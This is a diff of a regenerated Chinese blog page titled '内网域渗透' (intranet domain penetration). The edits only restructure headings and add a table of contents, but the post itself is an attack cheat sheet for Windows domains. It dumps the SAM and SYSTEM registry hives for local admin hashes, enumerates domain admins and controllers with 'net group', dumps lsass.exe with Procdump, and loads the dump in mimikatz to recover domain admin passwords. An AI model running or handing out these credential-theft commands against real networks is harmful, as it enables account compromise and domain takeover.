@@ -85,24 +85,24 @@
 
 
 <meta name="description" content="导出本地管理员 Hash12reg save hklm\sam sam.hivereg save hklm\system system.hive
-1.获得域管理员帐号net group &amp;quot;domain admins&amp;quot; /domain
-2.获得域控制器net group &amp;quot;domain controllers&amp;quot; /domain
-3.获得域名net view /">
+获得域管理员帐号net group &amp;quot;domain admins&amp;quot; /domain
+获得域控制器net group &amp;quot;domain controllers&amp;quot; /domain
+获得域名net view /domain">
 <meta property="og:type" content="article">
 <meta property="og:title" content="内网域渗透">
 <meta property="og:url" content="http://blog.sxin.me/2014/02/10/intenetdomainhack/index.html">
 <meta property="og:site_name" content="SxinBoss的个人博客">
 <meta property="og:description" content="导出本地管理员 Hash12reg save hklm\sam sam.hivereg save hklm\system system.hive
-1.获得域管理员帐号net group &amp;quot;domain admins&amp;quot; /domain
-2.获得域控制器net group &amp;quot;domain controllers&amp;quot; /domain
-3.获得域名net view /">
-<meta property="og:updated_time" content="2016-11-14T11:14:48.000Z">
+获得域管理员帐号net group &amp;quot;domain admins&amp;quot; /domain
+获得域控制器net group &amp;quot;domain controllers&amp;quot; /domain
+获得域名net view /domain">
+<meta property="og:updated_time" content="2016-11-14T11:27:10.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="内网域渗透">
 <meta name="twitter:description" content="导出本地管理员 Hash12reg save hklm\sam sam.hivereg save hklm\system system.hive
-1.获得域管理员帐号net group &amp;quot;domain admins&amp;quot; /domain
-2.获得域控制器net group &amp;quot;domain controllers&amp;quot; /domain
-3.获得域名net view /">
+获得域管理员帐号net group &amp;quot;domain admins&amp;quot; /domain
+获得域控制器net group &amp;quot;domain controllers&amp;quot; /domain
+获得域名net view /domain">
 
 
 
@@ -331,7 +331,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-check-o"></i>
             </span>
-            <time title="Post modified" itemprop="dateModified" datetime="2016-11-14T19:14:48+08:00">
+            <time title="Post modified" itemprop="dateModified" datetime="2016-11-14T19:27:10+08:00">
               2016-11-14
             </time>
             
@@ -399,9 +399,10 @@
 
       
         <p>导出本地管理员 Hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">reg save hklm\sam sam.hive</div><div class="line">reg save hklm\system system.hive</div></pre></td></tr></table></figure></p>
-<p>1.获得域管理员帐号<br><code>net group &quot;domain admins&quot; /domain</code></p>
-<p>2.获得域控制器<br><code>net group &quot;domain controllers&quot; /domain</code></p>
-<p>3.获得域名<br><code>net view /domain</code><br><a id="more"></a><br>4.获得域管理员密码<br><code>http://blog.csdn.net/yiyefangzhou24/article/details/11760277</code></p>
+<h3 id="获得域管理员帐号"><a href="#获得域管理员帐号" class="headerlink" title="获得域管理员帐号"></a>获得域管理员帐号</h3><p><code>net group &quot;domain admins&quot; /domain</code></p>
+<h3 id="获得域控制器"><a href="#获得域控制器" class="headerlink" title="获得域控制器"></a>获得域控制器</h3><p><code>net group &quot;domain controllers&quot; /domain</code></p>
+<h3 id="获得域名"><a href="#获得域名" class="headerlink" title="获得域名"></a>获得域名</h3><p><code>net view /domain</code><br><a id="more"></a></p>
+<h3 id="获得域管理员密码"><a href="#获得域管理员密码" class="headerlink" title="获得域管理员密码"></a>获得域管理员密码</h3><p><code>http://blog.csdn.net/yiyefangzhou24/article/details/11760277</code></p>
 <p><code>Procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></p>
 <p>下载地址:<a href="http://technet.microsoft.com/en-us/sysinternals/dd996900" target="_blank" rel="external">http://technet.microsoft.com/en-us/sysinternals/dd996900</a></p>
 <p>mimikatz #<code>sekurlsa::minidump lsass.dmp</code></p>
@@ -529,8 +530,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="http://7xskk8.com1.z0.glb.clouddn.com/blog_touxiang.png"
@@ -621,6 +631,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#获得域管理员帐号"><span class="nav-number">1.</span> <span class="nav-text">获得域管理员帐号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获得域控制器"><span class="nav-number">2.</span> <span class="nav-text">获得域控制器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获得域名"><span class="nav-number">3.</span> <span class="nav-text">获得域名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获得域管理员密码"><span class="nav-number">4.</span> <span class="nav-text">获得域管理员密码</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
     </div>
